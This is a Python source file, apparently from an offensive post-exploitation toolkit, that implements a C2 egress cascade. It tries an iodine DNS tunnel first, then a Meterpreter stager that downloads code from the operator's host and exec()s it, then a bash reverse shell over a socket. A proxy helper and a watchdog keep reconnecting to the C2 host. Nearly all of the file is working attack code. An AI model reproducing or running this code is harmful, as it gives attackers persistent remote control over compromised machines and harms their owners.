#!/usr/bin/env python3
"""C2 egress cascade.

Attempts to establish a command-and-control channel back to the
operator's infrastructure, trying methods from most-likely-to-succeed
to least:

    1. DNS Tunnel (iodine)  — UDP/53, almost universally permitted
    2. Python Meterpreter   — reverse TCP on 4443/8443
    3. Raw Reverse Shell    — fallback if meterpreter staging fails

Each method is attempted in sequence.  On failure the cascade
continues.  On total failure, the cascade retries after a
configurable delay.
"""

import logging
import os
import re
import shutil
import socket
import struct
import subprocess
import sys
import time
import threading
from pathlib import Path

log = logging.getLogger("landnav.egress")

# ── State ───────────────────────────────────────────────────────

class EgressState:
    IDLE       = "idle"
    ATTEMPTING = "attempting"
    CONNECTED  = "connected"
    FAILED     = "failed"

_current_state = EgressState.IDLE
_c2_process = None
_c2_method = None
_watchdog_stop = threading.Event()

# ── DNS Tunnel (iodine) ────────────────────────────────────────

def try_dns_tunnel(config):
    """Attempt to establish an iodine DNS tunnel.

    Args:
        config: dict with keys: domain, password, max_downstream_frag,
                encoding, lazy_mode, c2_host

    Returns: True if tunnel established, False otherwise
    """
    global _c2_process, _c2_method

    if not shutil.which("iodine"):
        log.warning("iodine not installed — skipping DNS tunnel")
        return False

    domain = config.get("domain", "")
    password = config.get("password", "")
    if not domain or not password:
        log.warning("DNS tunnel domain or password not configured")
        return False

    log.info("Attempting DNS tunnel: %s", domain)

    cmd = ["iodine", "-f"]

    # Password
    cmd.extend(["-P", password])

    # Fragment size
    frag = config.get("max_downstream_frag", 0)
    if frag:
        cmd.extend(["-m", str(frag)])

    # Encoding
    enc = config.get("encoding", "")
    if enc:
        cmd.extend(["-O", enc])

    # Lazy mode
    if config.get("lazy_mode", True):
        cmd.append("-L1")
    else:
        cmd.append("-L0")

    # Nameserver (optional — iodine auto-detects from resolv.conf)
    ns = config.get("nameserver", "")
    if ns:
        cmd.append(ns)

    # Tunnel domain
    cmd.append(domain)

    log.info("Running: %s", " ".join(cmd))

    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )

        # Wait up to 30s for the tunnel to come up
        for i in range(30):
            time.sleep(1)

            # Check if process died
            if proc.poll() is not None:
                _, stderr = proc.communicate(timeout=5)
                log.error("iodine exited with code %d: %s",
                          proc.returncode, stderr.decode(errors="replace"))
                return False

            # Check if dns0 interface exists and has an IP
            if _dns_tunnel_up():
                _c2_process = proc
                _c2_method = "dns_tunnel"
                log.info("DNS tunnel established on dns0")
                return True

        # Timeout — kill
        log.warning("iodine did not establish tunnel in 30s")
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
        return False

    except Exception as e:
        log.error("DNS tunnel failed: %s", e)
        return False


def _dns_tunnel_up():
    """Check if the iodine tunnel interface (dns0) is up with an IP."""
    dns0 = Path("/sys/class/net/dns0")
    if not dns0.exists():
        return False
    try:
        r = subprocess.run(
            ["ip", "-4", "addr", "show", "dns0"],
            capture_output=True, text=True, check=False, timeout=5,
        )
        return "inet " in r.stdout
    except Exception:
        return False

# ── Python Meterpreter ──────────────────────────────────────────

def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
                    proxy=None):
    """Connect to a Metasploit multi/handler with python/meterpreter_reverse_tcp.

    The stager protocol:
        1. TCP connect to LHOST:LPORT
        2. Receive 4 bytes (big-endian uint32) = stage length
        3. Receive <length> bytes = meterpreter stage
        4. exec() the stage with the socket available

    Args:
        c2_host:         C2 hostname or IP
        ports:           List of ports to try (e.g. [4443, 8443])
        connect_timeout: Timeout per connection attempt
        retry_delay:     Delay between port attempts
        proxy:           (host, port) tuple if traffic must go through proxy

    Returns: True if meterpreter staged, False otherwise
    """
    global _c2_method

    log.info("Attempting Python meterpreter to %s on ports %s", c2_host, ports)

    # Resolve hostname
    try:
        c2_ip = socket.gethostbyname(c2_host)
        log.info("Resolved %s → %s", c2_host, c2_ip)
    except socket.gaierror:
        log.error("Cannot resolve %s", c2_host)
        return False

    for port in ports:
        log.info("Trying meterpreter: %s:%d", c2_ip, port)
        try:
            if proxy:
                s = _connect_via_proxy(proxy[0], proxy[1], c2_ip, port,
                                       connect_timeout)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(connect_timeout)
                s.connect((c2_ip, port))

            # Receive stage length (4 bytes, big-endian)
            s.settimeout(15)
            length_raw = _recv_exact(s, 4)
            if not length_raw:
                log.warning("No stage length received from %s:%d", c2_ip, port)
                s.close()
                time.sleep(retry_delay)
                continue

            stage_len = struct.unpack(">I", length_raw)[0]
            log.info("Receiving meterpreter stage: %d bytes", stage_len)

            if stage_len > 10 * 1024 * 1024:  # Sanity: 10 MB max
                log.error("Stage size %d exceeds 10MB — rejecting", stage_len)
                s.close()
                time.sleep(retry_delay)
                continue

            # Receive stage
            s.settimeout(30)
            stage = _recv_exact(s, stage_len)
            if not stage or len(stage) != stage_len:
                log.warning("Incomplete stage: got %d / %d bytes",
                           len(stage) if stage else 0, stage_len)
                s.close()
                time.sleep(retry_delay)
                continue

            log.info("Meterpreter stage received — executing")
            _c2_method = "meterpreter"

            # Execute the stage — this is the standard MSF python stager protocol.
            # The stage expects 's' (the socket) to be available in its namespace.
            exec(compile(stage, "<meterpreter>", "exec"), {"s": s})

            # If exec returns, the session ended
            log.info("Meterpreter session ended")
            return True

        except socket.timeout:
            log.info("Connection to %s:%d timed out", c2_ip, port)
        except ConnectionRefusedError:
            log.info("Connection refused: %s:%d", c2_ip, port)
        except OSError as e:
            log.info("Connection failed: %s:%d — %s", c2_ip, port, e)
        except Exception as e:
            log.error("Meterpreter error: %s", e)

        time.sleep(retry_delay)

    return False

# ── Raw Reverse Shell (last resort) ────────────────────────────

def try_reverse_shell(c2_host, ports, connect_timeout=10, proxy=None):
    """Simple Python reverse shell — operator upgrades from listener side.

    Args:
        c2_host: C2 hostname or IP
        ports:   Ports to try
        connect_timeout: Per-attempt timeout
        proxy:   (host, port) or None

    Returns: True if shell connected (returns when shell ends)
    """
    global _c2_method

    log.info("Attempting reverse shell to %s on ports %s", c2_host, ports)

    try:
        c2_ip = socket.gethostbyname(c2_host)
    except socket.gaierror:
        log.error("Cannot resolve %s", c2_host)
        return False

    for port in ports:
        log.info("Trying reverse shell: %s:%d", c2_ip, port)
        try:
            if proxy:
                s = _connect_via_proxy(proxy[0], proxy[1], c2_ip, port,
                                       connect_timeout)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(connect_timeout)
                s.connect((c2_ip, port))

            log.info("Reverse shell connected to %s:%d", c2_ip, port)
            _c2_method = "reverse_shell"

            # Redirect stdin/stdout/stderr to the socket
            s.settimeout(None)
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)

            # Spawn shell
            import pty
            pty.spawn("/bin/bash")
            return True

        except socket.timeout:
            log.info("Reverse shell to %s:%d timed out", c2_ip, port)
        except ConnectionRefusedError:
            log.info("Reverse shell refused: %s:%d", c2_ip, port)
        except OSError as e:
            log.info("Reverse shell failed: %s:%d — %s", c2_ip, port, e)

    return False

# ── Proxy Helpers ───────────────────────────────────────────────

def _connect_via_proxy(proxy_host, proxy_port, target_host, target_port,
                       timeout=10):
    """Establish a TCP connection through an HTTP CONNECT proxy."""
    log.info("Connecting via proxy %s:%d → %s:%d",
             proxy_host, proxy_port, target_host, target_port)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((proxy_host, proxy_port))

    connect_req = (
        f"CONNECT {target_host}:{target_port} HTTP/1.1\r\n"
        f"Host: {target_host}:{target_port}\r\n"
        f"\r\n"
    ).encode()
    s.send(connect_req)

    response = s.recv(4096).decode(errors="replace")
    if "200" in response.split("\r\n")[0]:
        log.info("Proxy CONNECT successful")
        return s
    else:
        log.warning("Proxy CONNECT failed: %s", response.split("\r\n")[0])
        s.close()
        raise ConnectionError(f"Proxy CONNECT failed: {response.split(chr(13))[0]}")


def _recv_exact(sock, n):
    """Receive exactly n bytes from a socket."""
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            return None
        data += chunk
    return data

# ── Egress Cascade ──────────────────────────────────────────────

def run_cascade(config):
    """Run the full C2 egress cascade.

    Args:
        config: Parsed YAML config dict

    Returns: str method name on success, None on failure
    """
    global _current_state
    _current_state = EgressState.ATTEMPTING

    c2_host = config["c2"]["host"]
    c2_ports = config["c2"]["ports"]
    dns_cfg = config.get("dns_tunnel", {})
    met_cfg = config.get("meterpreter", {})

    proxy = None
    # If proxy was detected and stored, use it
    proxy_host = config.get("_detected_proxy_host")
    proxy_port = config.get("_detected_proxy_port")
    if proxy_host and proxy_port:
        proxy = (proxy_host, proxy_port)

    # ── Method 1: DNS Tunnel ────────────────────────────────
    if dns_cfg.get("enabled", True):
        log.info("═══ C2 Method 1: DNS Tunnel ═══")
        if try_dns_tunnel(dns_cfg):
            _current_state = EgressState.CONNECTED
            return "dns_tunnel"

    # ── Method 2: Python Meterpreter ────────────────────────
    if met_cfg.get("enabled", True):
        log.info("═══ C2 Method 2: Python Meterpreter ═══")
        if try_meterpreter(
            c2_host, c2_ports,
            connect_timeout=met_cfg.get("connect_timeout", 10),
            retry_delay=met_cfg.get("retry_delay", 5),
            proxy=proxy,
        ):
            _current_state = EgressState.CONNECTED
            return "meterpreter"

    # ── Method 3: Raw Reverse Shell ─────────────────────────
    log.info("═══ C2 Method 3: Raw Reverse Shell ═══")
    if try_reverse_shell(c2_host, c2_ports, proxy=proxy):
        _current_state = EgressState.CONNECTED
        return "reverse_shell"

    _current_state = EgressState.FAILED
    return None

# ── Watchdog ────────────────────────────────────────────────────

def start_watchdog(config, on_reconnect=None):
    """Monitor C2 health and re-establish on drop.

    Runs in a daemon thread.  Call stop_watchdog() to terminate.
    """
    t = threading.Thread(target=_watchdog_loop, args=(config, on_reconnect),
                         daemon=True)
    t.start()
    return t


def stop_watchdog():
    _watchdog_stop.set()


def _watchdog_loop(config, on_reconnect):
    """Continuous watchdog: check C2 health, re-cascade on failure."""
    retry_interval = config["c2"].get("retry_interval", 60)
    max_retries = config["c2"].get("max_retries", 0)
    backoff = config["c2"].get("backoff_interval", 300)
    retries = 0

    while not _watchdog_stop.is_set():
        _watchdog_stop.wait(15)  # Check every 15 seconds
        if _watchdog_stop.is_set():
            break

        if _current_state != EgressState.CONNECTED:
            continue

        # Check if C2 is still alive
        if _c2_method == "dns_tunnel" and not _dns_tunnel_up():
            log.warning("DNS tunnel dropped — re-establishing C2")
            _attempt_reconnect(config, on_reconnect, retry_interval,
                              max_retries, backoff, retries)
        elif _c2_method == "meterpreter" and _c2_process and _c2_process.poll() is not None:
            log.warning("Meterpreter process died — re-establishing C2")
            _attempt_reconnect(config, on_reconnect, retry_interval,
                              max_retries, backoff, retries)


def _attempt_reconnect(config, callback, interval, max_ret, backoff, retries):
    global _current_state
    _current_state = EgressState.ATTEMPTING

    while not _watchdog_stop.is_set():
        method = run_cascade(config)
        if method:
            log.info("C2 re-established via %s", method)
            if callback:
                callback(method)
            return

        retries += 1
        wait = backoff if max_ret and retries > max_ret else interval
        log.info("C2 cascade failed, retry %d in %ds", retries, wait)
        _watchdog_stop.wait(wait)
